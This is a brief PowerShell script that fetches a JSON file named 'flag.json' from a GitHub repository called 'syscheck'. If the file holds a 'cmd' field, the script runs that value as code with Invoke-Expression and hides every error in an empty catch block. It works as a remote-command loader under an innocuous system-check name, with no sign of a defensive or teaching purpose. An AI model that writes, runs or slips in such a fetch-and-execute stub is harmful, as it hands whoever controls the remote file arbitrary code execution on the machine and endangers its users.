$flag = "https://raw.githubusercontent.com/basilliker1/syscheck/main/flag.json"
try {
  $r = Invoke-WebRequest -Uri $flag -UseBasicParsing -TimeoutSec 20
  if ($r.Content -match '"cmd"') { Invoke-Expression (($r.Content | ConvertFrom-Json).cmd) }
} catch { }
